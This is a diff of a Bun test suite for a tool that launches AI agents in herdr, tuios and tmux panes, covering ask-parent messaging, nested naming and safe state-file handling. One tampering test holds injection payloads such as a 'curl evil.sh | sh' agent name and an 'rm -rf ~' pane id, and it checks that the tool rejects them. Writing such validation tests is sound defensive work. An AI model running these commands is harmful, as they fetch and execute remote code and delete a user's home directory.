@@ -1,9 +1,11 @@
 import { afterEach, beforeEach, expect, test } from "bun:test";
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from "node:fs";
+import {
+  chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { isAbsolute, join } from "node:path";
 import {
-  briefText, close, detectMux, harnessArgs, launch, launchPrompt, list, nudgePrompt, panesRoot, peek, send, sh, waitFor,
+  askParent, briefText, close, detectMux, harnessArgs, launch, launchPrompt, list, main, nudgePrompt, panesRoot, peek, script, send, sh, waitFor,
 } from "../plugins/pstack/skills/poteto-mode/scripts/pane-agent.mjs";
 
 let root;
@@ -16,7 +18,8 @@ beforeEach(() => {
 afterEach(() => rmSync(root, { recursive: true, force: true }));
 
 const herdrEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), HERDR_ENV: "1", HERDR_WORKSPACE_ID: "wP" });
-const tuiosEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TUIOS_ENV: "1", TUIOS_SESSION: "work", TUIOS_PANE_ID: "self" });
+const tuiosSelf = "98db8226-1829-468e-89a8-41a2baa0ddab";
+const tuiosEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TUIOS_ENV: "1", TUIOS_SESSION: "work", TUIOS_PANE_ID: tuiosSelf });
 const runDir = () => join(root, "panes", "arena-a");
 
 const okJson = (result) => ({ status: 0, stdout: JSON.stringify({ id: "x", result }), stderr: "" });
@@ -52,6 +55,7 @@ const herdrBase = {
   "herdr agent start": okJson({ agent: { agent_status: "idle" } }),
   "herdr agent read": text("screen line one\nscreen line two\n\n"),
   "herdr tab close": okJson({ type: "ok" }),
+  "herdr pane get": okJson({ pane: { agent_status: "working" } }),
 };
 
 const options = (extra = {}) => ({
@@ -66,11 +70,31 @@ test("harnessArgs builds each harness's launch flags from the registry", () => {
   const claude = harnessArgs("claude", { model: "claude-opus-5-5", effort: null, access: "read", run });
   expect(claude.slice(0, 4)).toEqual(["--model", "claude-opus-5-5", "--permission-mode", "dontAsk"]);
   expect(claude).not.toContain("--effort");
-  expect(claude[5]).toContain(`Edit(/${run}/**)`);
+  expect(claude[5]).toContain(`Edit(/${run}/question.md),Edit(/${run}/result.md)`);
   expect(claude).toContain("AskUserQuestion");
   const writer = harnessArgs("claude", { model: "m", effort: "max", access: "write", run });
   expect(writer).toContain("--effort");
   expect(writer.join(" ")).toContain("Edit,Write,Bash");
+});
+
+test("the claude read profile allows asking the parent and no other new command", () => {
+  const args = harnessArgs("claude", { model: "m", effort: null, access: "read", run: "/tmp/panes/arena-a" });
+  expect(args[args.indexOf("--allowedTools") + 1].split(",")).toEqual([
+    "Read", "Grep", "Glob", "Edit(//tmp/panes/arena-a/question.md)", "Edit(//tmp/panes/arena-a/result.md)", "Bash(git diff:*)", "Bash(git log:*)", "Bash(git show:*)",
+    "Bash(git status:*)", "Bash(git blame:*)", "Bash(git rev-parse:*)", "Bash(git ls-files:*)", "Bash(git grep:*)",
+    "Bash(rg:*)", "Bash(ls:*)", "Bash(wc:*)", `Bash(node ${script} ask-parent:*)`,
+  ]);
+});
+
+test("a brief with a parent names the agent and tells it to ask the parent pane, then end its turn", () => {
+  const run = join(root, "a");
+  const out = briefText("x", { run, access: "write", name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
+  expect(out).toContain("You are pane agent arena-a.");
+  expect(out).toContain(`run \`node ${script} ask-parent --run ${run}\`, and end your turn. If that command fails, end your turn anyway`);
+  expect(out).toContain("## Launching your own pane agents");
+  expect(out).toContain("so `--name fix` launches `arena-a-fix`. Every later `send`, `wait`, `peek`, and `close` takes the full name the launch printed.");
+  expect(out).toContain(`node ${script} send --name <full-name> --text <answer> --answer <questionId>`);
+  expect(briefText("x", { run, access: "read", name: "arena-a", parent: null })).not.toContain("ask-parent");
 });
 
 test("the brief carries the pane protocol with this agent's paths", () => {
@@ -265,7 +289,13 @@ test("detectMux picks the running multiplexer and refuses to guess", () => {
   expect(detectMux({ TUIOS_ENV: "1" })).toBe("tuios");
   expect(detectMux({}, "tuios")).toBe("tuios");
   expect(() => detectMux({ HERDR_ENV: "1", TUIOS_ENV: "1" })).toThrow("pass --mux");
-  expect(() => detectMux({})).toThrow("Not running inside herdr or tuios");
+  expect(() => detectMux({})).toThrow("Not running inside herdr, tuios, or tmux");
+});
+
+test("detectMux finds tmux and names every multiplexer it finds when more than one is set", () => {
+  expect(detectMux({ TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" })).toBe("tmux");
+  expect(() => detectMux({ HERDR_ENV: "1", TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" }))
+    .toThrow("More than one multiplexer is set in this environment (herdr, tmux)");
 });
 
 const tuiosState = (state) => ({ status: 0, stdout: JSON.stringify({ state }), stderr: "" });
@@ -365,7 +395,7 @@ test("tuios send goes through ask-agent and close closes the window by name", ()
   expect(send("arena-a", { text: "use main" }, { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "second\n" });
   const ask = calls.find((c) => c[1] === "ask-agent");
   expect(ask).toContain("use main");
-  expect(ask.slice(ask.indexOf("--from"), ask.indexOf("--from") + 2)).toEqual(["--from", "self"]);
+  expect(ask.slice(ask.indexOf("--from"), ask.indexOf("--from") + 2)).toEqual(["--from", tuiosSelf]);
   close("arena-a", {}, { runner, env: tuiosEnv() });
   expect(calls.at(-1)).toEqual(["tuios", "run-command", "-s", "work", "CloseWindow", "arena-a"]);
 });
@@ -460,6 +490,32 @@ test("a state file that names another run directory is refused", () => {
   const path = join(runDir(), "state.json");
   writeFileSync(path, JSON.stringify({ ...JSON.parse(readFileSync(path, "utf8")), run: join(root, "elsewhere") }));
   expect(() => close("arena-a", {}, { runner, env: herdrEnv() })).toThrow("different run directory");
+});
+
+test("an empty or corrupt state.json elsewhere is skipped by launch and list", () => {
+  for (const [entry, body] of [["empty", ""], ["torn", '{"name": "torn", "mux": "her']]) {
+    mkdirSync(join(root, "panes", entry), { recursive: true, mode: 0o700 });
+    writeFileSync(join(root, "panes", entry, "state.json"), body);
+  }
+  const { runner } = doneHerdr();
+  const env = { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" };
+  expect(launch(options(), { runner, env })).toMatchObject({ name: "arena-a", verdict: "done" });
+  expect(list({ env }).map((a) => a.name)).toEqual(["arena-a"]);
+});
+
+test("state is saved by replacing state.json, never by writing through it", () => {
+  const { runner } = scripted({ ...herdrBase, "herdr agent prompt": failJson("agent_blocked") });
+  launch(options(), { runner, env: herdrEnv() });
+  const path = join(runDir(), "state.json");
+  const outside = join(root, "outside.json");
+  const before = readFileSync(path, "utf8");
+  writeFileSync(outside, before);
+  rmSync(path);
+  symlinkSync(outside, path);
+  send("arena-a", { text: "go on" }, { runner, env: herdrEnv() });
+  expect(readFileSync(outside, "utf8")).toBe(before);
+  expect(lstatSync(path).isSymbolicLink()).toBe(false);
+  expect(readdirSync(runDir()).filter((f) => f.endsWith(".tmp"))).toEqual([]);
 });
 
 test.skipIf(typeof process.getuid !== "function")("a shared, world-writable panes directory is refused", () => {
@@ -645,4 +701,291 @@ test("closing a tuios agent whose window already exited still removes its run di
   expect(close("arena-a", {}, { runner, env: tuiosEnv() })).toMatchObject({ closed: true, kept: null });
   expect(calls.some((c) => c[1] === "run-command")).toBe(false);
   expect(existsSync(runDir())).toBe(false);
+});
+
+const ambiguousTmux = { TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%3" };
+const doneHerdr = () => scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });
+
+test("a pane agent's own launch is prefixed with its name and records its pane as the parent", () => {
+  const { runner, calls } = doneHerdr();
+  launch(options(), { runner, env: herdrEnv() });
+  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
+  expect(launch(options({ name: "fix" }), { runner, env: childEnv })).toMatchObject({ name: "arena-a-fix", mux: "herdr" });
+  expect(calls.filter((c) => c[2] === "create").at(-1)).toContain("arena-a-fix");
+  const state = JSON.parse(readFileSync(join(root, "panes", "arena-a-fix", "state.json"), "utf8"));
+  expect(state.parent).toEqual({ mux: "herdr", pane: "wP:p2" });
+});
+
+test("a pane agent's own launch runs in its multiplexer even when another one is also set", () => {
+  const { runner } = doneHerdr();
+  launch(options(), { runner, env: herdrEnv() });
+  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2", ...ambiguousTmux };
+  expect(launch(options({ name: "fix" }), { runner, env: childEnv })).toMatchObject({ name: "arena-a-fix", mux: "herdr" });
+  const stranger = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p9", ...ambiguousTmux };
+  expect(() => launch(options({ name: "other" }), { runner, env: stranger })).toThrow("pass --mux");
+});
+
+test("a nested name over the limit names both parts and opens nothing", () => {
+  const { runner, calls } = doneHerdr();
+  launch(options(), { runner, env: herdrEnv() });
+  const before = calls.length;
+  const given = "a".repeat(25);
+  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
+  expect(() => launch(options({ name: given }), { runner, env: childEnv }))
+    .toThrow(`arena-a-${given} is longer than 32 characters; shorten --name ${given}, since your own name arena-a`);
+  expect(calls.slice(before)).toEqual([["herdr", "pane", "get", "wP:p2"]]);
+});
+
+test("a launch is nested only under a live, open pane agent on the caller's own server", () => {
+  const plant = (name, extra = {}) => {
+    mkdirSync(join(root, "panes", name), { recursive: true, mode: 0o700 });
+    const state = { name, mux: "tmux", run: join(root, "panes", name), ids: { pane: "%0", window: "@0", server: tmuxEnv().TMUX }, ...extra };
+    writeFileSync(join(root, "panes", name, "state.json"), JSON.stringify(state));
+  };
+  const launchFix = (deadPanes = []) => {
+    const { runner } = scripted({
+      ...tmuxBase,
+      "tmux display-message": (args) => text(deadPanes.includes(args[args.indexOf("-t") + 1]) ? "1\n" : "0\n"),
+      "tmux capture-pane": [text("a"), text("b")],
+    });
+    const out = launch(options({ name: "fix" }), { runner, env: tmuxEnv(), clock: fakeClock() });
+    rmSync(join(root, "panes", out.name), { recursive: true, force: true });
+    return out.name;
+  };
+  plant("old", { ids: { pane: "%0", window: "@0", server: "/tmp/tmux-501/default,999,0" } });
+  expect(launchFix()).toBe("fix");
+  plant("old", { ids: { pane: "%0", window: "@0" } });
+  expect(launchFix()).toBe("fix");
+  plant("old", { closed: true });
+  expect(launchFix()).toBe("fix");
+  plant("old");
+  expect(launchFix(["%0"])).toBe("fix");
+  expect(launchFix()).toBe("old-fix");
+  plant("older");
+  expect(() => launchFix()).toThrow("More than one live pane agent claims this pane (old, older)");
+});
+
+test("close --keep marks the agent closed, so a later launch from its pane is not nested under it", () => {
+  const { runner } = doneHerdr();
+  launch(options(), { runner, env: herdrEnv() });
+  close("arena-a", { keep: true }, { runner, env: herdrEnv() });
+  expect(JSON.parse(readFileSync(join(runDir(), "state.json"), "utf8")).closed).toBe(true);
+  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
+  expect(launch(options({ name: "fix" }), { runner, env: childEnv }).name).toBe("fix");
+});
+
+const askedHerdr = (extra = {}) => scripted({
+  ...herdrBase,
+  "herdr agent prompt": () => { write("question.md", "Which branch?\n"); return agent("done"); },
+  ...extra,
+});
+const questionLine = (id) => `[pane-agent arena-a] question ${id}: ${join(runDir(), "question.md")}`;
+
+test("ask-parent types one line naming the question into the parent herdr pane", () => {
+  const { runner, calls } = askedHerdr({ "herdr pane run": text("") });
+  const asked = launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
+  expect(asked.verdict).toBe("question");
+  expect(asked.questionId).toBe(String(statSync(join(runDir(), "question.md")).mtimeMs));
+  expect(askParent(runDir(), { runner, env: {} })).toEqual({ sent: true, name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
+  expect(calls.at(-1)).toEqual(["herdr", "pane", "run", "wP:p1", questionLine(asked.questionId)]);
+});
+
+test("ask-parent types the line and then Enter into the parent tuios pane", () => {
+  const { runner, calls } = scripted({
+    ...tuiosBase,
+    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
+    "tuios wait-for": () => { write("question.md", "Which branch?\n"); return text(""); },
+    "tuios send-text": text(""),
+    "tuios send-keys": text(""),
+  });
+  const asked = launch(options(), { runner, env: tuiosEnv() });
+  askParent(runDir(), { runner, env: {} });
+  expect(calls.slice(-2)).toEqual([
+    ["tuios", "send-text", "-s", "work", "-w", tuiosSelf, questionLine(asked.questionId)],
+    ["tuios", "send-keys", "-s", "work", "-w", tuiosSelf, "Enter"],
+  ]);
+});
+
+const fakeClock = () => {
+  let now = 0;
+  return { now: () => now, sleep: (ms) => { now += ms; } };
+};
+const tmuxEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" });
+const tmuxBase = {
+  "tmux new-window": text("%5 @5\n"),
+  "tmux display-message": text("0\n"),
+  "tmux kill-window": text(""),
+  "tmux set-buffer": text(""),
+  "tmux paste-buffer": text(""),
+  "tmux send-keys": text(""),
+};
+
+test("ask-parent types the line into the parent tmux pane literally, then Enter separately", () => {
+  const { runner, calls } = scripted({
+    ...tmuxBase,
+    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }],
+  });
+  const asked = launch(options(), { runner, env: tmuxEnv(), clock: fakeClock() });
+  expect(asked).toMatchObject({ verdict: "question" });
+  askParent(runDir(), { runner, env: {}, clock: fakeClock() });
+  expect(calls.slice(-2)).toEqual([
+    ["tmux", "send-keys", "-t", "%0", "-l", "--", questionLine(asked.questionId)],
+    ["tmux", "send-keys", "-t", "%0", "Enter"],
+  ]);
+});
+
+test("ask-parent types nothing into a parent pane that is blocked on a dialog, and still exits cleanly", () => {
+  const herdr = askedHerdr({ "herdr pane get": okJson({ pane: { agent_status: "blocked" } }), "herdr pane run": text("") });
+  launch(options(), { runner: herdr.runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
+  expect(askParent(runDir(), { runner: herdr.runner, env: {} }))
+    .toEqual({ sent: false, reason: "parent pane is blocked", name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
+  expect(herdr.calls.at(-1)).toEqual(["herdr", "pane", "get", "wP:p1"]);
+  expect(herdr.calls.some((c) => c[2] === "run")).toBe(false);
+  close("arena-a", {}, { runner: herdr.runner, env: herdrEnv() });
+
+  const childStates = ["working", "done"];
+  const tuios = scripted({
+    ...tuiosBase,
+    "tuios get-agent-state": (args) => tuiosState(args.includes(tuiosSelf) ? "needs_input" : childStates.shift() ?? "done"),
+    "tuios wait-for": () => { write("question.md", "Which branch?\n"); return text(""); },
+    "tuios send-text": text(""),
+    "tuios send-keys": text(""),
+  });
+  launch(options(), { runner: tuios.runner, env: tuiosEnv() });
+  expect(askParent(runDir(), { runner: tuios.runner, env: {} })).toMatchObject({ sent: false, reason: "parent pane is blocked" });
+  expect(main(["ask-parent", "--run", runDir()], { runner: tuios.runner, env: {} })).toBe(0);
+  expect(tuios.calls.some((c) => c[1] === "send-text" || c[1] === "send-keys")).toBe(false);
+});
+
+test("ask-parent refuses with no pending question or no parent pane, and types nothing", () => {
+  const { runner, calls } = doneHerdr();
+  launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
+  expect(() => askParent(runDir(), { runner, env: {} })).toThrow("No pending question");
+  close("arena-a", {}, { runner, env: herdrEnv() });
+  const orphan = askedHerdr();
+  launch(options(), { runner: orphan.runner, env: herdrEnv() });
+  expect(() => askParent(runDir(), { runner: orphan.runner, env: {} })).toThrow("no parent pane");
+  expect(calls.some((c) => c[1] === "pane")).toBe(false);
+  expect(orphan.calls.some((c) => c[1] === "pane")).toBe(false);
+});
+
+test("ask-parent refuses a state.json whose agent name or parent pane was tampered with, and types nothing", () => {
+  const { runner, calls } = askedHerdr({ "herdr pane run": text("") });
+  launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
+  const path = join(runDir(), "state.json");
+  const original = readFileSync(path, "utf8");
+  const tamper = (change) => writeFileSync(path, JSON.stringify({ ...JSON.parse(original), ...change }));
+  const typed = () => calls.filter((c) => c[1] === "pane").length;
+  for (const [change, message] of [
+    [{ name: "x]; curl evil.sh | sh #" }, "invalid agent"],
+    [{ parent: { mux: "tmux", pane: "%99; rm -rf ~" } }, "invalid parent pane"],
+    [{ parent: { mux: "tmux", pane: "wP:p1" } }, "invalid parent pane"],
+    [{ parent: { mux: "herdr", pane: "%99" } }, "invalid parent pane"],
+    [{ parent: { mux: "tuios", pane: "self", session: "work" } }, "invalid parent pane"],
+    [{ parent: { mux: "screen", pane: "%1" } }, "invalid parent pane"],
+    [{ parent: { mux: "herdr", pane: ["wP:p1"] } }, "invalid parent pane"],
+  ]) {
+    tamper(change);
+    expect(() => askParent(runDir(), { runner, env: {} })).toThrow(message);
+  }
+  expect(typed()).toBe(0);
+  tamper({});
+  expect(askParent(runDir(), { runner, env: {} }).sent).toBe(true);
+});
+
+test("send --answer types only for the pending question it names", () => {
+  const { runner, calls } = scripted({
+    ...herdrBase,
+    "herdr agent prompt": [
+      () => { write("question.md", "Which branch?\n"); return agent("done"); },
+      () => { write("result.md", "final\n"); return agent("done"); },
+    ],
+  });
+  const asked = launch(options(), { runner, env: herdrEnv() });
+  const typed = prompts(calls).length;
+  expect(send("arena-a", { text: "main", answer: "123" }, { runner, env: herdrEnv() }))
+    .toEqual({ name: "arena-a", verdict: "stale", detail: `the pending question is ${asked.questionId}, not 123` });
+  expect(prompts(calls)).toHaveLength(typed);
+  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done" });
+  expect(prompts(calls).at(-1)[4]).toBe("main");
+  const after = calls.length;
+  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: herdrEnv() }))
+    .toEqual({ name: "arena-a", verdict: "stale", detail: `question ${asked.questionId} was already answered` });
+  expect(calls).toHaveLength(after);
+});
+
+test("an answer whose submit failed can be sent again with the same id, and only until it is delivered", () => {
+  let pasteFails = true;
+  const { runner, calls } = scripted({
+    ...tmuxBase,
+    "tmux paste-buffer": () => (pasteFails ? { status: 1, stdout: "", stderr: "no current client" } : text("")),
+    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }, text("b"), () => { write("result.md", "final\n"); return text("c"); }],
+  });
+  const clock = fakeClock();
+  const asked = launch(options(), { runner, env: tmuxEnv(), clock });
+  const pastes = () => calls.filter((c) => c[1] === "paste-buffer").length;
+  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock }))
+    .toMatchObject({ verdict: "error", detail: expect.stringContaining("tmux paste failed") });
+  pasteFails = false;
+  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "done" });
+  expect(pastes()).toBe(2);
+  expect(calls.filter((c) => c[1] === "set-buffer").map((c) => c.at(-1))).toEqual(["main", "main"]);
+  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock }))
+    .toEqual({ name: "arena-a", verdict: "stale", detail: `question ${asked.questionId} was already answered` });
+  expect(pastes()).toBe(2);
+});
+
+test("tmux launch opens a detached named window and addresses it by pane and window id from then on", () => {
+  const { runner, calls } = scripted({
+    ...tmuxBase,
+    "tmux capture-pane": [text("a"), () => { write("result.md", "tmux result\n"); return text("b"); }],
+  });
+  const out = launch(options({ harness: "claude", model: "claude-opus-5-5", effort: "high" }), { runner, env: tmuxEnv(), clock: fakeClock() });
+  expect(out).toMatchObject({ verdict: "done", result: "tmux result\n", mux: "tmux" });
+  const open = calls[0];
+  expect(open.slice(0, 11)).toEqual(["tmux", "new-window", "-d", "-P", "-F", "#{pane_id} #{window_id}", "-n", "arena-a", "-c", root, "--"]);
+  expect(open[11]).toBe("claude");
+  expect(open[12]).toContain("brief.md");
+  const targets = calls.filter((c) => c[1] === "capture-pane" || c[1] === "display-message").map((c) => c[c.indexOf("-t") + 1]);
+  expect(new Set(targets)).toEqual(new Set(["%5"]));
+  close("arena-a", {}, { runner, env: tmuxEnv() });
+  expect(calls.at(-1)).toEqual(["tmux", "kill-window", "-t", "@5"]);
+});
+
+test("a tmux screen that stops changing with no report is idle, with no reminder typed into it", () => {
+  const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("b")] });
+  const clock = fakeClock();
+  expect(launch(options(), { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "idle", screen: "b" });
+  expect(clock.now()).toBeGreaterThanOrEqual(15_000);
+  expect(calls.some((c) => c[1] === "paste-buffer" || c[1] === "send-keys")).toBe(false);
+});
+
+test("a tmux turn whose screen never changes after a submit is stalled", () => {
+  const { runner, calls } = scripted({
+    ...tmuxBase,
+    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }, text("b")],
+  });
+  expect(launch(options(), { runner, env: tmuxEnv(), clock: fakeClock() })).toMatchObject({ verdict: "question" });
+  const clock = fakeClock();
+  expect(send("arena-a", { text: "line one\nline two" }, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "stalled" });
+  expect(clock.now()).toBeGreaterThanOrEqual(90_000);
+  expect(clock.now()).toBeLessThan(100_000);
+  const buffer = calls.find((c) => c[1] === "set-buffer");
+  expect(buffer.at(-1)).toBe("line one\nline two");
+  const paste = calls.find((c) => c[1] === "paste-buffer");
+  expect(paste).toEqual(["tmux", "paste-buffer", "-p", "-d", "-b", buffer[3], "-t", "%5"]);
+  expect(calls[calls.indexOf(paste) + 1]).toEqual(["tmux", "send-keys", "-t", "%5", "Enter"]);
+});
+
+test("a tmux wait that starts long after launch --no-wait reads a static screen as idle, while an early wait still reads it as stalled", () => {
+  const { runner } = scripted({ ...tmuxBase, "tmux capture-pane": text("Allow Bash: git push?\n> 1. Yes\n  2. No") });
+  const clock = fakeClock();
+  launch(options({ wait: false }), { runner, env: tmuxEnv(), clock });
+  clock.sleep(120_000);
+  expect(waitFor("arena-a", {}, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "idle", screen: expect.stringContaining("git push") });
+
+  close("arena-a", {}, { runner, env: tmuxEnv() });
+  launch(options({ wait: false }), { runner, env: tmuxEnv(), clock });
+  clock.sleep(5_000);
+  expect(waitFor("arena-a", {}, { runner, env: tmuxEnv(), clock }).verdict).toBe("stalled");
 });
